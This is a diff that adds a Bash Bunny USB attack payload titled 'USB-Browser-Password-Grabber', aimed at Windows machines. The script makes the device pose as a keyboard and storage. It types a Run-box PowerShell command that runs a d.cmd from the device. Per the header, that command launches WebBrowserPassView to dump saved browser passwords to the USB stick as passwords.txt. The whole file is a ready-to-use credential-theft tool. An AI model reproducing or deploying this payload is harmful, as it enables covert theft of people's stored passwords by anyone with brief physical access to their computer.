@@ -1,0 +1,32 @@
+#!/bin/bash
+#
+# Title:         USB-Browser-Password-Grabber (UBPG)
+# Author:        k1nd0ne
+# Version:       1.0
+# Target:        Windows XP SP3+ / 7 / 8 / 10
+# Props:         Diggster, IMcPwn, Hak5Darren
+# 
+#DESCRIPTION :
+# Executes d.cmd from the selected switch folder of the Bash Bunny USB Disk partition,
+# which execute WebBrowserPassView from the Bash Bunny and save it to the SWITCH folder as "passwords.txt".
+
+
+#IF YOU DON'T TRUST THE EXE FILE (which is totally normal) PLEASE DOWNLOAD WEB BROWSER PASSVIEW FROM 
+#THE OFFICIAL WEBSITE : http://nirsoft.net/password_recovery_tools.html 
+#(DON'T FORGET TO RENAME THE EXE FILE AS IT IS IN THE SCRIPT.
+
+
+#LED red : running...
+#LED green : you can run too now bunny !
+
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
+
+LED R
+ATTACKMODE HID STORAGE
+QUACK GUI r
+QUACK DELAY 100
+QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\d.cmd')" #props to hak5 for this amazing line
+QUACK ENTER
+LED G
+
